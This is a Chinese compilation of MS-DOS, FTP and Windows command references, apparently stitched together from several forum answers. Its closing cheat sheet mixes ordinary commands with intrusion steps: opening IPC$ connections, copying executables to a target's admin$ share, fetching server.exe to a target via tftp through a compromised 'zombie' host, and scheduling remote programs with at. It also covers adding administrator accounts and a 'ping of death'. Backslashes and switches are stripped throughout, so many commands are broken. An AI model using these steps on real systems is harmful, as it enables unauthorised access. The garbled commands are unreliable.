66.tenex：将文件传输类型设置为TENEX机的所需的类型。 

67.tick：设置传输时的字节计数器。 

68.trace：设置包跟踪。 

69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如： type binary，设置二进制传输方式。 

70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如： umask 3。 

71.user user-name[password][account]：向远程主机表明自己的身份， 需要口令时，必须输入口令，如：user anonymous my@email。 

72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp服务器的所有 响应都将显示给用户，缺省为on. 

73.?[cmd]：同help. 回答者： 咱继续张望 | 四级 | 2009-10-15 17:22 
           cd     改变当前目录       sys   制作DOS系统盘 

  copy    拷贝文件         del   删除文件 

  deltree   删除目录树        dir   列文件名 

  diskcopy  制磁盘          edit  文本编辑 

  format    格式化磁盘        md   建立子目录 

  mem     查看内存状况       type  显示文件内容 

  rd     删除目录         ren   改变文件名 

  记得多少啊，忘了就去上课看看，下面四个命令是新的，给出命令格式，你自己试试看，学电脑重要的就是摸索。 

  cls     清屏 

〔适用场合〕  屏幕上太乱了，或是屏幕上出现乱码了， 清除屏幕上显示内容但不
        影响电脑内部任何信息 

〔用  法〕  cls  回车 

  move     移动文件，改目录名  

〔适用场合〕  移动文件到别的目录 

〔用  法〕  move [文件名] [目录]        移动文件至新目录下 

        move [目录名] [目录名]       改目录名 


〔例  子〕  c:>move c:autoexec.bat c:old 

        移动autoexec.bat文件至old目录下 

        c:>move c:config.sys c:temp 

        移动config.sys文件至old目录下 


  more    分屏显示 

〔适用场合〕  当输出很多一屏显示不下时采用，几乎适合所有命令，尤其是type
        等命令时很有用。 使用more时磁盘不能有写保护，也不适合光驱。 

〔用  法〕  type [文件名] | more        分屏显示文件内容 

        more < [文件名]          分屏显示文件内容 


〔例  子〕  C:>type msdos.w40 | more 

  xcopy    拷贝目录和文件 

〔适用场合〕  在进行连同子目录一起拷贝时很有用，在拷贝大量文件时比COPY命令
        要快得多 

〔用  法〕  xcopy [文件名] [目录]       将指定文件拷贝到指定目录 

        xcopy [源目录] [目的目录]  将源目录连子目录考到目的目录下 

        xcopy *.* [目录] /s   将文件与非空子目录拷贝到指定目录 

        其它常用参数还有: v 拷贝后校验，会影响速度
                  e 与s 相似，但即使子目录是空的也会拷贝。
第2、比较常用的命令

  attrib   设置文件属性 

〔适用场合〕  想对文件做较特殊的处理时 

〔用  法〕  attrib 显示所有文件的属性 

        attrib +r或-r [文件名] 设置文件属性是否为只读 

        attrib +h或-h [文件名] 设置文件属性是否隐含 

        attrib +s或-s [文件名] 设置文件属性是否为系统文件 

        attrib +a或-a [文件名] 设置文件属性是否为归档文件 

        attrib /s 设置包括子目录的文件在内的文件属性 

〔例  子〕  C:TEST>attrib +r wina20.386 

        C:>attrib +h *.* /s 隐含所有文件 

  date     显示及修改日期 

〔适用场合〕  想知道或修改时间和日期 

〔用  法〕  date 显示和改变当前日期 

〔例  子〕  C:>date 09-20-1996 将日期改为1996年9月20日 

        C:>date 

          Current date is Tue 08-20-1996 

          Enter new date (mm-dd-yy):09-20-1996 

          按月-日-年的顺序修改当前日期 直接按回车键忽略修改日期 


  lable    设置卷标号 

〔适用场合〕  用来为磁盘做个标记 

〔用  法〕  label 显示磁盘卷标 

        label [盘符] [卷标名] 设定指定盘的卷标 

〔例  子〕  C:>label 
        Volume in drive C is WANG 
        Volume Serial Number is 2116-1DD0 
        volume label (11 characters,Enter for none)? 
        可以输入卷标，直接回车后 
        Delete current volume label (Y/N)? 
        按y删除旧卷标，按n不更改 

  defrag   磁盘碎片整理 

〔适用场合〕  磁盘读写次数很多，或磁盘使用时间很长了，可能需要使用这条命令
        整理磁盘。磁盘碎片并不是指磁盘坏了，而只是由于多次的拷贝和删
        除文件后，磁盘使用会很不连贯，致使速度变慢。 

〔用  法〕  1. C:>defrag 

        2. 选择要整理的磁盘


  doskey   调用和建立DOS宏命令 

〔适用场合〕  经常需要输入重复的命令时，有非常大的用处 

〔用  法〕  doskey  

        将doskey驻留内存，开辟出缓冲区，以后输入的命令都将保存在缓冲
        区中，可以随时调用 

        doskey [宏命令名]=[命令名]   

        将宏命令定义为命令，以后输入宏命令，电脑就会执行相应的命令 

        doskey /reinstall      重新安装doskey 

        doskey /bufsize=       设置缓冲区的大小 

        doskey /macros        显示所有doskey宏 

        doskey /history        显示内存中所有命令 

        doskey /insert|overstrike 设置新键入的字符是否覆盖旧的字符 

〔例  子〕  C:>DOSKEY 
        C:>dir 
        C:>copy C:temp*.* a: 
        C:>del c:temp*.* 
        C:>copy b:*.* c:temp 

        上述四条命令都已被保存，用光标控制键的上下可以依次选择使用或
        修改, 也可以用F7键列出保存的所有命令

        C:>doskey di=dir/w/p 定义di为宏命令，意思是执行dir/w/p 

  fdisk    硬盘分区 

〔建  议〕  只有硬盘被很利害的病毒感染时，或是一块新硬盘才需要分区，最好
        请懂行的人指导。硬盘都需经过低级格式化，分区，格式化三个步骤
        才可使用，成品电脑内的硬盘都已经做过这些加工了。 

〔用  法〕  输入fdisk后按回车即可进入提示界面 


  emm386   扩展内存管理 

〔建  议〕  这条命令比较复杂，在第五章中系统配置里将详细介绍 

lh/loadhigh   将程序装入高端内存 

〔适用场合〕  这条命令一般用在autoexec.bat中，当有些软件需要的基本内存很大
        时，它会有用 

〔用  法〕  lh [程序]   

        将程序装入高端内存 使用此命令时，config.sys文件中需有下面两
        条语句。 device=emm386.exe dos=umb 

        lh [程序] /l:区号    将程序装入指定的umb区 

        lh /s          一般是由memmaker专用 

〔例  子〕  C:MOUSE>lh mouse  将鼠标驱动程序装入高端内存 

 memmaker   内存优化管理 

〔适用场合〕  这个命令现在已经很少用了，在当年DOS流行时，想玩游戏可少不了 
        它，它可以腾出许多基本内存供游戏使用，只需安装一次即可 

〔用  法〕  1. C:>memmaker 

        2. 回车继续，F3退出 

        3. 选择手动安装和自动安装，直接回车表示自动安装（回车得了） 

        4. 选择是否有程序需要扩充内存，可用空格键选择，Yes表示需要，
        No不需要，按回车键即可。 

        5. 程序自动检测硬盘内是否安装了WINDOWS 

        6. 软驱中若有软盘则应将其取出，然后按回车键，电脑将重新起动
        两次，不要中断，只需按回车键。 

        （其实很简单，一直按回车键就行了，呵呵） 



  msd     系统检测 

〔适用场合〕  用于检查系统信息 

〔用  法〕  1. C:>msd 回车后可见到，在每个选项旁边加了注解，表
        示该按钮的功用 

       2. 选择需查询的项目，比如选第一个Computer,将会弹出一个对话框
        显示电脑的一些基本信息。你可以试试其他的选项，看看有什么用。
       3. 按Alt+F键激活下拉菜单后, 选择"Exit"项退出。 

 undelete   恢复被删除的文件 

〔适用场合〕  当不小心删错了文件时，它可以用得上。 

        DOS删除文件时，只是将文件从分配表中去除，在磁盘存储区内将文
        件名的第一个字母删除，文件内容并未马上从磁盘中删除，所以能恢
        复。 

〔用  法〕  undelete       恢复已删除的文件 

        undelete /all   恢复文件且不再询问是否恢复，      
        以"#%&-0123456789abcdefghijklmnopqrstuvwxyz"的顺序为第一个
        字母来恢复文件 

        undelete /list  列可恢复的文件名 

        undelete /s    可将undelete驻留内存，但几乎没人这样使用 


 prompt   设置提示符 

〔适用场合〕  当你厌烦了c:>的提示符或者您想使您的提示符与众不同时，您可以
        试一试，非常有趣的DOS命令，可以随时显示时间与日期。 

〔用  法〕  prompt $p$g 以当前目录名和>号为提示符，这是最常用的提示符 

        prompt $t 表示时间      prompt $d 表示日期 

        prompt $$ 表示$        prompt $q 表示= 

        prompt $v 表示当前版本    prompt $l 表示< 

        prompt $b 表示|        prompt $h 表示退位符 

        prompt $e 表示Esc代表的字符  prompt $_ 表示回车换行 

〔例  子〕  C:DOS>prompt wang$g 将wang>作为提示符 

        WANG>prompt $t$d$g  使用时间、日期和>号做为提示符 

        0:01:07.77Thu 08-29-1996>prompt $p$g 

        C:DOS> 

 restore   恢复已备份的文件 

〔建  议〕  如果以前用backup做过文件备份，则当原文件损坏时可以用它来恢复
        文件。 

        将用backup命令备份的磁盘中的文件恢复到另一磁盘中，备份磁盘中
        应有backup.00X和control.00X这两条文件。 

〔用  法〕  restore [备份盘符] [目标盘符] 

        将备份盘上备份文件恢复到指定盘上 

        restore /s     将备份文件包括子目录都恢复到指定盘上 

        restore /p     让用户判断是否恢复文件 

        restore /b:日期  恢复日期以前的文件 

        restore /a:日期  恢复日期之后的文件 

        restore /l:时间  恢复时间之前的文件 

        restore /e:时间  恢复时间之后的文件 

        restore /m     只恢复上次备份后修改过的文件 

        restore /n     只恢复上次备份后已删 除的文件 

        restore /d     只显示要恢复的文件名 

〔例  子〕  C:DOS>restore a: c: 
        Insert backup diskette 01 in drive A: 
        Press any key to continue . . . 

        在A驱中放入第一张备份盘，按任意键即可，恢复完第一张后，按顺
        序放入其它盘即可。 

        当您用上述命令不能正确恢复文件时请用： 

        C:DOS>restore a: c: /s 


  time    显示及修改时间 

〔适用场合〕  用于显示及修改时间，用法同date 

〔例  子〕  C:DOS>time 
        Current time is 12:15:26.04a 
        Enter new time: 11:20:20.00p 

        按时:分顺序输入时间，再加上下午(a/p)即可 直接按ENTER键可忽略
        修改时间。 

  set     设置环境变量 

〔适用场合〕  设置声卡和路径等时用到 

〔用  法〕  set [环境变量]=[字符串]    

        这条命令常常用在autoexec.bat中 

〔例  子〕  C:>set blaster=a220 i5 d1     设置声卡的参数 

        C:>set path=c:dos         path c:dos含义相同 

 smartdrv   设置磁盘加速器 

〔建  议〕  它可以提高硬盘访问速度，最好在autoexec.bat文件中加载吧。 

〔用  法〕  smartdrv /x 

        执行并驻留内存，开辟磁盘加速缓存区，并屏蔽所有驱动器缓存，是
        较常用的方法（一般用这个命令就够了） 

        smartdrv /c       将缓存内的信息都写入硬盘 

        smartdrv /e: 数字    设置一次移动的信息量 

        smartdrv /b: 数字    设置预先读取的缓冲区大小
第3、不常用的命令

 append    设置非执行文件的路径 

〔适用场合〕  当您无法在多个目录中寻找到自己输入的文稿时，可以试一试这个命
        令，用法类似path。 

〔用  法〕  append [路径];[路径] 


〔例  子〕  C:>append c:test 

        设置寻找非可执行文件路径为c:test如果该目录下有文件1.txt时，
        在其它目录下调用1.txt找不到时，可自动寻找到c:test目录。 

        D:UCDOS>edit 1.txt 可找到C:test1.txt文件 

 debug     程序调试命令 

〔建  议〕  如果你学过汇编语言，那你应该会使用debug，如果没学过，最好别
        使用 

〔用  法〕  debug [文件名] 

 diskcomp   比较磁盘 

〔适用场合〕  比较两张盘是否相同，没想到什么时候会用到，在比较用diskcopy拷
        贝的两张盘，为什么不用diskcopy/v校验呢？ 

〔用  法〕  diskcomp [盘符1] [盘符2] 比较盘1和盘2 

        diskcomp /1 只比较磁盘的第一面 

        diskcomp /8 只比较没磁道的前8个扇区 

〔例  子〕  C:>diskcomp a: a: 
        在同一软驱中比较两张盘 

        Insert FIRST diskette in drive A: 
        放入第一张盘 

        Press any key to continue . . . 

        Comparing 80 tracks 18 sectors per track, 2 side(s)   
        Insert SECOND diskette in drive A: 
        放入第二张盘 

        Press any key to continue . . . Compare OK 
        比较未发现不同 

        Compare another diskette (Y/N) ?n 
        是否比较其它盘，选y继续比较，选n停止 


 expand    解压工具 

〔适用场合〕  微软公司软件原始安装盘中有许多后缀以"_"结尾的压缩文件，可以 
        用它解压，解除您因为少数几个文件丢失造成的麻烦。 

〔用  法〕  expand [源文件名] [目的文件] 


〔例  子〕  C:>expand a:vsafe.co_ c:dosvsafe.com 

       解压vsafe.co_为vsafe.com文件 

        microsoft (R) File Expansion Utility Version 2.10    
        Copyright (C) Microsoft Corp 1990-1993. All rights    
        reserved. 

        Expanding a:vsafe.co_ to c:dosvsafe.com. a:vsafe.co_: 
        33046 bytes expanded to 62576 bytes, 89% increase. 

        C:DOS> 

 fasthelp   快速显示帮助信息 

〔建  议〕  可以看看所有的命令，对于单个的命令，还不如在命令名后加/?参数
        方便 

〔用  法〕  fasthelp       列出所有DOS命令的用处 

        fasthelp [命令名]  显示命令的用处，等价于 [命令名]/? 

   fc    文件比较 

〔建  议〕  也许对于大多数人是永远不会用到它的 

〔用  法〕  fc [文件名1] [文件名2]     比较两文件的不同       
        参数还有: a c l Lbn n t w nnnn 

〔例  子〕  C:TEST>fc a.bat b.bat 
        Comparing files A.BAT and B.BAT 
        ***** A.BAT 
        choice /c:dme defrag,mem,end 
        if errorlevel 3 goto defrag 
        if errorlevel 2 goto mem 
        if errotlevel 1 goto end 
        ***** B.BAT choice /c:dme defrag,mem,end 
        ***** C:TEST> 


 interlnk   启动简易网客户机 

〔适用场合〕  如果有两台电脑可以通过它和intersvr联成简易的网络，这是条很有
        用的命令，但不常用 

〔用  法〕   DOS新增支持网络的功能， 
        它可以使两台电脑通过并口线或串口线相联组成简易的网络 
        使用interlnk 必须在config.sys中增添一句： 
        device=c:dosinterlnk 
        并口线的两头都应是25针公接头，针之间的连接如下图：对应 
        p2------------------------p15 
        p3------------------------p13 
        p4------------------------p12 
        p5------------------------p10 公接头指接头为带针的 
        p6------------------------p11 母接头指接头为带孔的 
        p15-----------------------p2 
        p13-----------------------p3 
        p12-----------------------p4 
        p10-----------------------p5 
        p11-----------------------p6 
        p25-----------------------p25 地线 


〔例  子〕  C:DOS>interlnk Port-LPT1 

        this Computer    Other Computer 

         (Client)       (Server) 

          ---------------------------------------- 

            E:   equals   A: 

            F:   equals   C: 

        在客户机中E盘即为服务机的A盘，F盘为服务机的C盘 

 intersvr   启动简易网服务器 

〔适用场合〕  使用它，电脑就成了服务器了（只限与DOS提供的简易网） 

〔用  法〕  intersvr       启动服务机 

        intersvr /lpt:1   启动服务机,用lpt1口作为数据传输口 

        intersvr /com:1   启动服务机,用com1口作为数据传输口 

        参数还有 x baud: b v rcopy （参见interlnk) 

〔例  子〕  C:DOS>intersvr 

  qbasic   启动Basic集成环境 

〔建  议〕  也许对于大多数人是永远不会用到它的 

〔用  法〕  如果会qbasic语言，那么可以利用它编写自己的程序。edit.com必须
        有它才可用。 

        qbasic     起动basic语言环境 

        qbasic/editor 以全屏方式编辑语言 

        参数还有： b g h mbf nohi run 

〔例  子〕  C:DOS>qbasic 




 setver     设置版本 

〔适用场合〕  当希望使用其它版本的dos命令时可以用它来欺骗电脑。在高版本  
        DOS中，某些旧版本程序需要DOS3.3时，可用setver来设置 

〔用  法〕  使用时一般在config.sys中加入 device=setver.exe 

        setver          显示文件的版本 

        setver [文件名] n.nn   设置指定文件的版本号 


〔例  子〕  C:DOS>setver 
        KERNEL.EXE 5.00 
        DOSOAD.SYS 5.00 
        EDLIN.EXE 5.00 
        BACKUP.EXE 5.00 
        ASSIGN.COM 5.00 
        EXE2BIN.EXE 5.00 
        JOIN.EXE 5.00 
        RECOVER.EXE 5.00 
        WINWORD.EXE 4.10 
        C:> 

        若程序AAA.exe必须在MS-DOS3.3下执行，则键入 

        C:DOS>setver aaa.exe 3.30 

        又如net5.exe仅在MS-DOS5.0下执行，则在config.sys中加入   
        device=setver.exe后也可在Ms-DOS6.22下运行。 

  share    文件共享 

〔建  议〕  只有在软件声明必须要运行它时才用 

〔用  法〕  可在config.sys中加入 install=share.exe 也可直接运行    
        参数有 f l 

  subst    路径替换 

〔建  议〕  一个非常有趣的命令，如果经常用光碟软件，可能有用。 

〔用  法〕  subst           显示当前的替代路径 

        subst [盘符] [路径]                    
        将指定的路径替代盘符，该路径将作为驱动器使用 

        subst /b         解除替代 

〔例  子〕  C:DOS>subst a: c:temp 用c盘temp目录替代a盘 

        C:>subst a: /d     解除替代 


  tree     显示命令树结构 

〔适用场合〕  查看所有的子目录 

〔用  法〕  tree [盘符]    显示所有的子目录树 

        tree /f      显示目录时同时显示文件名 

        tree /a      以ASCII码显示目录树 


〔例  子〕  C:WINDOWS>tree /a 

 unformat   恢复已被格式化的磁盘 

〔建  议〕  你把有重要信息的软盘格式化了?快用unformat……什么?你用了  
        format /u，那死定了 

〔用  法〕  unformat [盘符]    恢复指定的被格式化的磁盘 

        unformat /l      显示unformat所找到的文件名 

〔例  子〕  C:WINDOWS>unformat a: 


  vsafe    病毒防护程序 

〔建  议〕  把它装入内存可以随时检测出许多种病毒，是比较有用的。 

〔用  法〕  vsafe        加载vsafe在内存中 

        vsafe /u       从内存中去除vsafe 

        vsafe/ne       将vsafe装入扩充内存 

        vsafe/nx       将vsafe装入扩展内存 

        参数还有 Ax Cx n d 

〔例  子〕  C:>vsafe 


 ver     显示DOS版本 

〔例  子〕  C:>ver 

       MS-DOS Version 6.22 

        C:> 

  vol     显示指定的磁盘卷标号 

〔例  子〕  C:>vol 

        Volume in drive C is Wang 

        Volume Serial Number is 2116-1DD0 

        C:> 


  ctty    改变控制设备 

〔建  议〕  用来改变控制的输入输出设备，可以试试这条命令，不过恐怕不会有
        什么作用，是DOS中最没用的命令之一 

〔用  法〕  ctty [设备名]    设置控制台 

〔例  子〕  C:>ctty aux    设置aux为输入输出设备 



dos基础命令
1 dir 
无参数：查看当前所在目录的文件和文件夹。 
/s：查看当前目录已经其所有子目录的文件和文件夹。 
/a：查看包括隐含文件的所有文件。 
/ah：只显示出隐含文件。 
/w：以紧凑方式（一行显示5个文件）显示文件和文件夹。 
/p：以分页方式（显示一页之后会自动暂停）显示。 
|more：前面那个符号是“\”上面的那个，叫做重定向符号，就是把一个 命令的结果输出为另外一个命令的参数。more也是一个命令，dir /w |more 得到的结果和dir /w /p的结果是一样的。 其他的参数大家可以用：dir/?查看。 
2 cd 
cd 目录名：进入特定的目录。如果看到有个目录显示为：abcdef ghi 就 输入：cdabcdef.ghi进入该目录。 
cd\ 退回到根目录。 
cd..退回到上一级目录。 

3 md rd 
md 目录名：建立特定的文件夹。 （dos下面习惯叫目录，win下面习惯叫文 件夹。呵呵！） 
rd 目录名：删除特定的文件夹。 
4 cls 
清除屏幕。 
5 copy 
copy 路径\文件名 路径\文件名 ：把一个文件拷贝到另一个地方。 
6 move 
move 路径\文件名 路径\文件名 ：把一个文件移动（就是剪切+复制）到另 一个地方。 
7 del 
del 文件名：删除一个文件。 
del *.*：删除当前文件夹下所有文件。 
del不能删除文件夹。 
8 deltree 
删除文件夹和它下面的所有子文件夹还有文件，厉害。。。不要乱用。 
10 type 
type 文本文件名：显示出文本文件的内容。 
11 edit 
其实这是个小程序，编辑文本文件用的。 
12 ren 
ren 旧文件名 新文件名：改文件名。 
二、关于网络的常用命令 
1 ping 
ping 主机ip或名字：向目标主机发送4个icmp数据包，测试对方主机是否收 
到并响应，一般常用于做普通网络是否通畅的测试。但是ping不同不代表网 络不通，有可能是目标主机装有防火墙并且阻止了icmp响应。 
ping -t ：不停的发送数据包。当然都很小，不能称作攻击。有些人自己写 了一些类似于ping命令的程序，不停的发送很大的数据包，以阻塞目标主机 的网络连接。 
3 netstat 
netstat 主机：查看主机当前的tcp/ip连接状态，如端口的状态。 
5 tracert 
tracert 主机：查看从你自己到目标逐机到底经过了那些路径。如： tracert www.ncie.gov.cn 然后等待。就会看到你经过的一个个路由节 点，一般大一点的路由器，如电信的主干路由，除了ip以外，都有英文标示 的。 
8 telnet 
字符方式的远程登录程序，是网络人员极其爱用的远程登录程序。我最近常用来调试邮件服务器。 
9 ipconfig 非常有用的网络配置、排错。命令。 不加参数显示当前机器的网络接口状态。 
/all 先是详细的信息。 
/release 释放当前ip。 
/renew 重新申请ip。 
/flushdns 刷新dns缓存。 
/registerdns 重新栽dns服务器上注册自己。 
10 arp 操作当前的arp缓存。 
-a 显示arp缓存。 
-d 删除一条缓存纪录。 
-s 田家一条缓存纪录。 
11 nslookup 排除dns错误的利器。是一个交互的工具。使用之前请先努力弄清楚dns的作用以及dns的工作原理。
xcopy是一个外部命令，也就是说，是一个小程序，有的时候会发现软盘上没有，硬盘上也没有。当然勇气来使比copy好用，我喜欢加/e参数。 

time 指定运行命令的时间。 
/interactive 允许作业在运行时，与当时登录的用户 桌面进行交互。 
/every:date[,...] 每个月或每个星期在指定的日期运行命令。 如果省略日期，则默认为在每月的本日运行。 
/next:date[,...] 指定在下一个指定日期(如，下周四)运行命令。 如果省略日期，则默认为在每月的本日运行。 
"command" 准备运行的 Windows NT 命令或批处理程序。

Tab






net user

禁用远程服务：
sc config TermService start= disabled

net use ipipc$ del 删除IPC链接
net use h del 删除映射对方到本地的为H的映射
net user 用户名　密码　add 建立用户
net user guest activeyes 激活guest用户
net user 查看有哪些用户
net user 帐户名 查看帐户的属性
net localgroup administrators 用户名 add 把“用户”添加到管理员中使其

具有管理员权限,注意：administrator后加s用复数
net start 查看开启了哪些服务
net start 服务名　 开启服务；(如net start telnet， net start schedule)
net stop 服务名 停止某服务
net time 目标ip 查看对方时间
net time 目标ip set 设置本地计算机时间与“目标IP”主机的时间同步,加

上参数yes可取消确认信息
net view 查看本地局域网内开启了哪些共享
net view ip 查看对方局域网内开启了哪些共享
net config 显示系统网络设置
net logoff 断开连接的共享
net pause 服务名 暂停某服务
net send ip 文本信息 向对方发信息
net ver 局域网内正在使用的网络连接类型和信息
net share 查看本地开启的共享
net share ipc$ 开启ipc$共享
net share ipc$ del 删除ipc$共享
net share c$ del 删除C：共享
net user guest 12345 用guest用户登陆后用将密码改为12345
net password 密码 更改系统登陆密码
netstat -a 查看开启了哪些端口,常用netstat -an
netstat -n 查看端口的网络连接情况，常用netstat -an
netstat -v 查看正在进行的工作
netstat -p 协议名 例：netstat -p tcqip 查看某协议使用情况（查看tcpip

协议使用情况）
netstat -s 查看正在使用的所有协议使用情况
nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的

用户名（03前的为用户名）-注意：参数-A要大写
tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设

置超时间隔。
ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]

数据包大小”；“-n发送数据次数”；“-t”指一直ping。
ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之

ping)
ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，

ipconfig可用参数“all”显示全部配置信息
tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装

目录的Supporttools文件夹内)
kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安

装的，在安装目录的Supporttools文件夹内)
del -F 文件名 加-F参数后就可删除只读文件,AR、AH、AS、AA分别表示删除

只读、隐藏、系统、存档文件，A-R、A-H、A-S、A-A表示删除除只读、隐藏

、系统、存档以外的文件。例如“DELAR .”表示删除当前目录下所有只读文

件，“DELA-S .”表示删除当前目录下除系统文件以外的所有文件

del S Q 目录 或用：rmdir s Q 目录 S删除目录及目录下的所有子目录和

文件。同时使用参数Q 可取消删除操作时的系统确认就直接删除。（二个命令作

用相同）
move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件

,用参数y将取消确认移动目录存在相同文件的提示就直接覆盖
fc one.txt two.txt  3st.txt 对比二个文件并把不同之处输出到3st.txt文件

中， 和  是重定向命令
at id号 开启已注册的某个计划任务
at delete 停止所有计划任务，用参数yes则不需要确认就直接停止
at id号 delete 停止某个已注册的计划任务
at 查看所有的计划任务
at ip time 程序名(或一个命令) r 在某时间运行对方某程序并重新启动计算

机
finger username @host 查看最近有哪些用户登陆
telnet ip 端口 远和登陆服务器,默认端口为23
open ip 连接到IP（属telnet登陆后的命令）
telnet 在本机上直接键入telnet 将进入本机的telnet
copy 路径文件名1　路径文件名2 y 复制文件1到指定的目录为文件2，用参数

y就同时取消确认你要改写一份现存目录文件
copy csrv.exe ipadmin$ 复制本地csrv.exe到对方的admin下
cppy 1st.jpgb+2st.txta 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成

3st.jpg新的文件，注：2st.txt文件头要空三排，参数：b指二进制文件，a指

ASCLL格式文件
copy ipadmin$svv.exe c 或copyipadmin$. 复制对方admini$共享

下的srv.exe文件（所有文件）至本地C：
xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数Y

将不提示覆盖相同文件
tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe cserver.exe

登陆后，将“IP”的server.exe下载到目标主机cserver.exe 参数：-i指以二

进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模

式）进行传送
tftp -i 对方IP　put cserver.exe 登陆后，上传本地cserver.exe至主机
ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二

进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)
route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码

Netmask，网关地址Gateway addres，接口地址Interface
arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理

性的MAC地址。arp -a将显示出全部信息
start 程序名或命令 max 或min 新开一个新窗口并最大化（最小化）运行某程

序或命令
mem 查看cpu使用情况
attrib 文件名(目录名) 查看某文件（目录）的属性
attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读

，系统，隐藏 属性；用＋则是添加为某属性
dir 查看文件，参数：Q显示文件及目录属系统哪个用户，TC显示文件创建时

间，TA显示文件上次被访问时间，TW上次被修改时间
date t 、 time t 使用此参数即“DATET”、“TIMET”将只显示当前日期和

时间，而不必输入新日期和时间
set 指定环境变量名称=要指派给变量的字符 设置环境变量
set 显示当前所有的环境变量
set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量
pause 暂停批处理程序，并显示出：请按任意键继续....
if 在批处理程序中执行条件处理（更多说明见if命令及变量）
goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以

冒号打头，例如：“：start”标签）
call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见

call ）
for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）
echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置
echo 信息 在屏幕上显示出信息
echo 信息  pass.txt 将信息保存到pass.txt文件中
findstr Hello aa.txt 在aa.txt文件中寻找字符串hello
find 文件名 查找某文件
title 标题名字 更改CMD窗口标题名字
color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿

、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、

D=淡紫、E=淡黄、F=亮白
prompt 名称 更改cmd.exe的显示的命令提示符(把C、D统一改为：EntSky )
print 文件名 打印文本文件

ver 在DOS窗口下显示版本信息
winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名

）
format 盘符 FS类型 格式化磁盘,类型FAT、FAT32、NTFS ,例：Format D

FSNTFS
md　目录名 创建目录
replace 源文件　要替换文件的目录 替换文件
ren 原文件名　新文件名 重命名文件名
tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称
type 文件名 显示文本文件的内容
more 文件名 逐屏显示输出文件
doskey 要锁定的命令＝字符
doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，

并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；

解锁：doskey dir=
taskmgr 调出任务管理器
chkdsk F D 检查磁盘D并显示状态报告；加参数f并修复磁盘上的错误
tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务

默认端口23为其它任何端口
exit 退出cmd.exe程序或目前，用参数B则是退出当前批处理脚本而不是cmd.exe
path 路径可执行文件的文件名 为可执行文件设置一个路径。
cmd 启动一个win2K命令解释窗口。参数：eff、en 关闭、开启命令扩展；更我

详细说明见cmd
regedit s 注册表文件名 导入注册表；参数S指安静模式导入，无任何提示；
regedit e 注册表文件名 导出注册表
cacls 文件名　参数 显示或修改文件访问控制列表（ACL）--针对NTFS格式时

。参数：D 用户名设定拒绝某用户访问；P 用户名erm 替换指定用户的访问

权限；G 用户名erm 赋予指定用户访问权限；Perm 可以是 N 无，R 读取，

W 写入， C 更改(写入)，F 完全控制；例：cacls Dtest.txt D pub 设定

dtest.txt拒绝pub用户访问。
cacls 文件名 查看文件的访问用户权限列表
REM 文本内容 在批处理文件中添加注解
netsh 查看或更改本地网络配置情况

IIS服务命令：
iisreset reboot 重启win2k计算机（但有提示系统将重启信息出现）
iisreset start或stop 启动（停止）所有Internet服务
iisreset restart 停止然后重新启动所有Internet服务
iisreset status 显示所有Internet服务状态
iisreset enable或disable 在本地系统上启用（禁用）Internet服务的重新启

